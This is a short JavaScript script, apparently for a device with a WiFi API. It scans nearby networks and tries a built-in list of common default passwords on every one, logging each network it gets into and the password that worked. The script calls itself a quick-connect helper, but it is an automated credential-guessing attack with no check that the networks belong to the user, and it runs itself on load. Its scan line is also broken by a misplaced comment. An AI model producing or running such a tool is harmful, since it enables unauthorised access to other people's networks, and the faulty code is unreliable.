// Quick WiFi Connect - Auto-connect to common default credentials
// Tests networks with typical manufacturer passwords

function quickWifiConnect() {
    var common_creds = [
        {ssid: "*", password: "password"},
        {ssid: "*", password: "12345678"},
        {ssid: "*", password: "admin123"},
        {ssid: "*", password: "123456"},
        {ssid: "NETGEAR", password: ""},
        {ssid: "Linksys", password: "admin"},
    ];

    var results = [];

    // Scan first
    var networks = // wifi.scan(5000);

    if (networks) {
        for (var n = 0; n < networks.length; n++) {
            var net = networks[n];

            for (var c = 0; c < common_creds.length; c++) {
                var cred = common_creds[c];

                if (net.ssid.indexOf(cred.ssid) >= 0 || cred.ssid === "*") {
                    // wifi.connect(ssid, password, timeout)
                    var connected = wifi.connect(net.ssid, cred.password, 5000);

                    if (connected) {
                        results.push({
                            ssid: net.ssid,
                            password: cred.password,
                            status: "Connected"
                        });
                        break; // found password for this network
                    }
                }
            }
        }
    }

    return {
        action: "Default Credential Attempts",
        networks_scanned: networks ? networks.length : 0,
        successful_connections: results.length,
        results: results
    };
}

// Run connector
quickWifiConnect();
